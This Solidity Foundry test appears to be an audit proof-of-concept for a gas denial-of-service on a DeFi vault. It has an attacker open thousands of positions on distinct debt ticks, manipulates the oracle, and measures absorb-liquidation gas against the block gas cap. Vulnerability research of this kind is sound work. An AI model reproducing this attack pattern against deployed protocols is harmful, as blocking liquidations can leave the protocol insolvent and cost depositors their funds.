// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import "../dex/poolT1/vaults.t.sol";

interface IRawStorageReader {
    function readFromStorage(bytes32 slot_) external view returns (uint256);
}

contract AbsorbGasDosTest is VaultsBaseTest {
    uint256 internal constant POSITION_DATA_SLOT = 3;
    uint256 internal constant SUPPLY_SHARES_PER_POSITION = 1e17; // 0.1 smart-collateral share
    uint256 internal constant INITIAL_DEBT_SHARES = 1e13;
    uint256 internal constant DEBT_GROWTH_NUMERATOR = 10020; // +0.20%, above one 0.15% vault tick
    uint256 internal constant DEBT_GROWTH_DENOMINATOR = 10000;
    uint256 internal constant ATTACK_ORACLE_PRICE = 1e22;
    uint256 internal constant HEALTHY_ORACLE_PRICE = 1e27;

    bytes4 internal constant LIQUIDATE_PERFECT_SELECTOR =
        bytes4(keccak256("liquidatePerfect(uint256,uint256,uint256,uint256,uint256,uint256,address,bool)"));

    struct GasResult {
        uint256 gasUsed;
        bool completed;
        uint256 returnDataLength;
    }

    function test_absorbGasScalesWithUniqueTicks() public {
        // The base setup already grants approvals. Refreshing balances makes the
        // economic cost explicit and prevents funding from being the test limit.
        deal(DAI_USDC_VAULT.dex.token0, alice, 1e30);
        deal(DAI_USDC_VAULT.dex.token1, alice, 1e30);

        uint256 blockGasCap_ = vm.envOr("PLASMA_BLOCK_GAS_LIMIT", uint256(30_000_000));
        uint256 wideGasCap_ = blockGasCap_ * 4;
        if (wideGasCap_ < 120_000_000) wideGasCap_ = 120_000_000;

        uint256[8] memory checkpoints_ = [
            uint256(64),
            uint256(128),
            uint256(256),
            uint256(512),
            uint256(1024),
            uint256(2048),
            uint256(3072),
            uint256(4096)
        ];

        uint256 debtShares_ = INITIAL_DEBT_SHARES;
        uint256 totalDebtShares_;
        uint256 checkpointIndex_;
        uint256 previousWideGas_;
        int256 previousTick_ = type(int256).min;

        for (uint256 i = 1; i <= checkpoints_[checkpoints_.length - 1]; ++i) {
            vm.prank(alice);
            (uint256 nftId_, ) = DAI_USDC_VAULT.vaultT4.operatePerfect(
                0,
                int256(SUPPLY_SHARES_PER_POSITION),
                int256(type(int128).max),
                int256(type(int128).max),
                int256(debtShares_),
                1,
                1,
                alice
            );

            int256 tick_ = _positionTick(nftId_);
            assertTrue(tick_ > previousTick_, "each attacker position must occupy a new higher tick");
            previousTick_ = tick_;
            totalDebtShares_ += debtShares_;

            if (i == checkpoints_[checkpointIndex_]) {
                _setOraclePrice(DAI_USDC_VAULT, VaultType.VaultT4, ATTACK_ORACLE_PRICE);

                GasResult memory wide_ = _measureAbsorb(wideGasCap_);
                GasResult memory blockCapped_ = _measureAbsorb(blockGasCap_);

                assertTrue(wide_.completed, "absorb did not complete even with the wide diagnostic gas cap");
                if (previousWideGas_ != 0) {
                    assertTrue(wide_.gasUsed > previousWideGas_, "absorb gas must grow with unique toxic ticks");
                }
                previousWideGas_ = wide_.gasUsed;

                emit log_named_uint("positions", i);
                emit log_named_int("last unique tick", tick_);
                emit log_named_uint("aggregate supplied collateral shares", i * SUPPLY_SHARES_PER_POSITION);
                emit log_named_uint("aggregate borrowed debt shares", totalDebtShares_);
                emit log_named_uint("wide-cap absorb gas used", wide_.gasUsed);
                emit log_named_uint("chain block gas cap", blockGasCap_);
                emit log_named_uint("block-capped absorb completed", blockCapped_.completed ? 1 : 0);
                emit log_named_uint("block-capped call gas used", blockCapped_.gasUsed);
                emit log_named_uint("block-capped return-data bytes", blockCapped_.returnDataLength);

                _setOraclePrice(DAI_USDC_VAULT, VaultType.VaultT4, HEALTHY_ORACLE_PRICE);
                ++checkpointIndex_;
            }

            debtShares_ = (debtShares_ * DEBT_GROWTH_NUMERATOR) / DEBT_GROWTH_DENOMINATOR;
        }

        assertEq(checkpointIndex_, checkpoints_.length, "all checkpoints must execute");
    }

    function _measureAbsorb(uint256 gasCap_) internal returns (GasResult memory result_) {
        uint256 snapshot_ = vm.snapshot();
        bytes memory payload_ = abi.encodeWithSelector(
            LIQUIDATE_PERFECT_SELECTOR,
            uint256(0), // absorb-only path: no liquidator debt shares supplied
            uint256(0),
            uint256(0),
            uint256(0),
            uint256(0),
            uint256(0),
            alice,
            true
        );

        uint256 gasBefore_ = gasleft();
        (result_.completed, bytes memory returnData_) = address(DAI_USDC_VAULT.vaultT4).call{ gas: gasCap_ }(
            payload_
        );
        result_.gasUsed = gasBefore_ - gasleft();
        result_.returnDataLength = returnData_.length;

        assertTrue(vm.revertTo(snapshot_), "snapshot restore failed");
    }

    function _positionTick(uint256 nftId_) internal view returns (int256 tick_) {
        bytes32 slot_ = keccak256(abi.encode(nftId_, POSITION_DATA_SLOT));
        uint256 raw_ = IRawStorageReader(address(DAI_USDC_VAULT.vaultT4)).readFromStorage(slot_);

        assertEq(raw_ & 1, 0, "position unexpectedly has no debt");

        uint256 encodedTick_ = (raw_ >> 1) & 0xfffff;
        uint256 absoluteTick_ = (encodedTick_ >> 1) & 0x7ffff;
        tick_ = (encodedTick_ & 1) == 1 ? int256(absoluteTick_) : -int256(absoluteTick_);
    }
}
